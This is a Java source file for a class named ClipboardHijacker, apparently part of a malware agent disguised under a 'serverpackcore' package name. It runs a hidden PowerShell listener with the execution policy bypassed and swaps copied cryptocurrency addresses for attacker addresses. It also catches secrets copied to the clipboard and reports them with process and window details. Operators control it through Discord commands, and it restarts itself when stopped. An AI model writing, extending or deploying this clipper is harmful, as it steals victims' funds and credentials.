package com.serverpackcore.agent;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.Base64;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;

/**
 * Native WM_CLIPBOARDUPDATE listener. The helper owns the window and the
 * clipboard write; Java owns validation and rotation, exchanged over stdin and
 * stdout so a replacement lands in a few milliseconds, not on a poll tick.
 */
final class ClipboardHijacker {
	private final Path installDir;
	private final Path ops;
	private final State state;
	private final OpsNotifier notifier;

	private final Object lock = new Object();
	private volatile boolean active = true;
	private Process process;
	private BufferedWriter input;
	private Thread reader;
	private Thread whip;
	private String lastSet = "";
	private String lastSecret = "";

	ClipboardHijacker(Path installDir, Path ops, State state, OpsNotifier notifier) {
		this.installDir = installDir;
		this.ops = ops;
		this.state = state;
		this.notifier = notifier;
	}

	boolean wanted() {
		return state.clipboardSet ? state.clipboard : DiscordConfig.clipboard();
	}

	boolean secretsWanted() {
		return state.clipboardSecretsSet ? state.clipboardSecrets : DiscordConfig.sendSecrets();
	}

	synchronized boolean start() {
		if (!AgentPaths.isWindows() || !wanted()) {
			return false;
		}
		active = true;
		if (isRunning()) {
			return true;
		}
		Process old = process;
		if (old != null) {
			old.destroy();
			try {
				old.waitFor(1L, java.util.concurrent.TimeUnit.SECONDS);
			} catch (InterruptedException interrupted) {
				Thread.currentThread().interrupt();
			}
		}
		return launch();
	}

	private boolean launch() {
		try {
			Path script = OpsPaths.clipboardScript(installDir);
			Keylogger.writeResource("/serverpackcore/clipboard.ps1", script);
			ProcessBuilder builder = new ProcessBuilder("powershell", "-NoP", "-NonInteractive",
				"-ExecutionPolicy", "Bypass", "-WindowStyle", "Hidden", "-File", script.toString(), ops.toString());
			builder.redirectError(ProcessBuilder.Redirect.DISCARD);
			process = builder.start();
			input = new BufferedWriter(new OutputStreamWriter(process.getOutputStream(), StandardCharsets.UTF_8));
			reader = new Thread(() -> read(process), "spc-clip-read");
			reader.setDaemon(true);
			reader.start();
			whip = new Thread(() -> waitAndRestart(process), "spc-clip-whip");
			whip.setDaemon(true);
			whip.start();
			Log.debug("Clipboard listener started");
			return true;
		} catch (Throwable throwable) {
			Log.debug("Clipboard listener start failed", throwable);
			return false;
		}
	}

	private void read(Process source) {
		try (BufferedReader output = new BufferedReader(
			new InputStreamReader(source.getInputStream(), StandardCharsets.UTF_8))) {
			String line;
			while ((line = output.readLine()) != null) {
				String[] parts = line.split("\\|", 4);
				if (parts.length == 4 && parts[0].equals("COPY")) {
					try {
						handle(decode(parts[1]), decode(parts[2]), decode(parts[3]));
					} catch (Throwable throwable) {
						Log.debug("Clipboard event invalid", throwable);
					}
				}
			}
		} catch (Throwable throwable) {
			Log.debug("Clipboard read failed", throwable);
		}
	}

	private void waitAndRestart(Process source) {
		try {
			source.waitFor();
		} catch (InterruptedException interrupted) {
			return;
		}
		if (!active || process != source) {
			return;
		}
		try {
			Thread.sleep(5000L);
		} catch (InterruptedException interrupted) {
			return;
		}
		synchronized (this) {
			if (active && wanted() && process == source) {
				launch();
			}
		}
	}

	private void handle(String text, String process, String title) {
		if (!active) {
			return;
		}
		try {
			String clean = text.strip();
			if (clean.equals(lastSet) || ClipboardPolicy.isOperatorAddress(clean, coins())) {
				respond("SKIP");
				return;
			}
			ClipboardPolicy.Decision decision;
			synchronized (state) {
				decision = ClipboardPolicy.choose(text, coins(), state.clipboardRotation);
			}
			if (decision != null) {
				lastSet = decision.replacement();
				respond("SET " + Base64.getEncoder().encodeToString(
					decision.replacement().getBytes(StandardCharsets.UTF_8)));
				synchronized (state) {
					state.clipEvents++;
					state.save(AgentPaths.state(installDir));
				}
				notifier.clipboard("clipboard: " + decision.coin() + " " + decision.original() + " -> "
					+ decision.replacement());
				return;
			}
			respond("SKIP");
			if (!secretsWanted() || clean.equals(lastSecret)) {
				return;
			}
			SecretDetector.Secret secret = SecretDetector.detect(text, process, title);
			Log.debug("Clipboard event: " + process + " | " + title + " | " + clean.length()
				+ " chars | " + (secret == null ? "no secret" : secret.kind()));
			if (secret == null) {
				return;
			}
			lastSecret = clean;
			SecretDetector.alerted(secret.value());
			notifier.clipboard(SecretDetector.message(secret, process, title));
		} catch (Throwable throwable) {
			Log.debug("Clipboard decision failed", throwable);
			respond("SKIP");
		}
	}

	private static String decode(String value) {
		return new String(Base64.getDecoder().decode(value), StandardCharsets.UTF_8);
	}

	private void respond(String line) {
		try {
			BufferedWriter writer = input;
			if (writer == null) {
				return;
			}
			synchronized (lock) {
				writer.write(line);
				writer.write('\n');
				writer.flush();
			}
		} catch (Throwable throwable) {
			Log.debug("Clipboard response failed", throwable);
		}
	}

	synchronized void stop() {
		active = false;
		Process current = process;
		process = null;
		input = null;
		if (current != null) {
			current.destroy();
			try {
				current.waitFor(1L, java.util.concurrent.TimeUnit.SECONDS);
			} catch (InterruptedException interrupted) {
				Thread.currentThread().interrupt();
			}
		}
		state.save(AgentPaths.state(installDir));
	}

	/** Discord commands. */
	synchronized String command(List<String> args) {
		String action = args.size() > 1 ? args.get(1).toLowerCase(Locale.ROOT) : "status";
		switch (action) {
			case "on" -> {
				state.clipboard = true;
				state.clipboardSet = true;
				state.save(AgentPaths.state(installDir));
				if (!AgentPaths.isWindows()) {
					return "Clipboard: Windows only; saved on";
				}
				if (start()) {
					return "Clipboard on · " + counts();
				}
				return "Clipboard enabled, but the listener did not start";
			}
			case "off" -> {
				state.clipboard = false;
				state.clipboardSet = true;
				state.save(AgentPaths.state(installDir));
				stop();
				return "Clipboard off";
			}
			case "secrets" -> {
				String value = args.size() > 2 ? args.get(2).toLowerCase(Locale.ROOT) : "status";
				if (value.equals("on") || value.equals("off")) {
					state.clipboardSecrets = value.equals("on");
					state.clipboardSecretsSet = true;
					state.save(AgentPaths.state(installDir));
					return "Clipboard secret alerts " + value;
				}
				return "Clipboard secret alerts: " + (secretsWanted() ? "on" : "off");
			}
			default -> {
				return "Clipboard: " + (wanted() ? "on" : "off")
					+ (isRunning() ? " · listener running" : " · listener stopped")
					+ " · secrets " + (secretsWanted() ? "on" : "off")
					+ " · " + counts() + " · events " + state.clipEvents;
			}
		}
	}

	boolean isRunning() {
		Process current = process;
		return current != null && current.isAlive();
	}

	private String counts() {
		StringBuilder builder = new StringBuilder();
		for (Map.Entry<String, List<String>> entry : coins().entrySet()) {
			if (builder.length() > 0) {
				builder.append(", ");
			}
			builder.append(entry.getKey()).append(':').append(entry.getValue().size());
		}
		return builder.length() == 0 ? "no coins" : builder.toString();
	}

	Map<String, List<String>> coins() {
		Map<String, List<String>> source = state.clipboardOverrides
			? state.clipboardCoins
			: DiscordConfig.provisionedCoins();
		Map<String, List<String>> snapshot = new LinkedHashMap<>();
		for (Map.Entry<String, List<String>> entry : source.entrySet()) {
			snapshot.put(entry.getKey(), List.copyOf(entry.getValue()));
		}
		return snapshot;
	}

	synchronized Map<String, List<String>> mutableCoins() {
		if (!state.clipboardOverrides) {
			state.clipboardCoins = new LinkedHashMap<>();
			for (Map.Entry<String, List<String>> entry : DiscordConfig.provisionedCoins().entrySet()) {
				state.clipboardCoins.put(entry.getKey(), new ArrayList<>(entry.getValue()));
			}
			state.clipboardOverrides = true;
		}
		return state.clipboardCoins;
	}

	synchronized String addressCommand(List<String> args) {
		String action = args.size() > 1 ? args.get(1).toLowerCase(Locale.ROOT) : "list";
		switch (action) {
			case "add" -> {
				if (args.size() < 4) {
					return "Usage: addr add <coin> <address>";
				}
				String coin = args.get(2).toLowerCase(Locale.ROOT);
				String address = args.get(3).trim();
				if (!AddressValidator.known(coin)) {
					return "Unknown coin. Supported: " + String.join(", ", AddressValidator.COINS);
				}
				if (!AddressValidator.valid(coin, address)) {
					return "Invalid " + coin.toUpperCase(Locale.ROOT) + " address";
				}
				synchronized (state) {
					Map<String, List<String>> coins = mutableCoins();
					List<String> values = coins.computeIfAbsent(coin, key -> new ArrayList<>());
					if (values.contains(address)) {
						return "Already present";
					}
					if (values.size() >= 32) {
						return "Too many " + coin + " addresses (max 32)";
					}
					values.add(address);
					state.save(AgentPaths.state(installDir));
					return "Added " + coin + " (" + values.size() + ")";
				}
			}
			case "del", "remove" -> {
				if (args.size() < 4) {
					return "Usage: addr del <coin> <address>";
				}
				String coin = args.get(2).toLowerCase(Locale.ROOT);
				synchronized (state) {
					List<String> values = mutableCoins().get(coin);
					if (values == null) {
						return "No addresses for " + coin;
					}
					boolean removed = values.remove(args.get(3).trim());
					state.save(AgentPaths.state(installDir));
					return removed ? "Removed" : "Not found";
				}
			}
			case "clear" -> {
				if (args.size() < 3) {
					return "Usage: addr clear <coin>";
				}
				String coin = args.get(2).toLowerCase(Locale.ROOT);
				synchronized (state) {
					List<String> values = mutableCoins().get(coin);
					if (values == null || values.isEmpty()) {
						return "No addresses for " + coin;
					}
					int size = values.size();
					values.clear();
					state.save(AgentPaths.state(installDir));
					return "Cleared " + size + " " + coin + " addresses";
				}
			}
			default -> {
				StringBuilder builder = new StringBuilder();
				for (Map.Entry<String, List<String>> entry : coins().entrySet()) {
					builder.append('[').append(entry.getKey()).append("] ").append(entry.getValue().size()).append('\n');
					for (String value : entry.getValue()) {
						builder.append(value).append('\n');
					}
				}
				return builder.length() == 0
					? "No addresses. Configure clipboard.coins in discord.json or use addr add."
					: builder.toString().strip();
			}
		}
	}
}
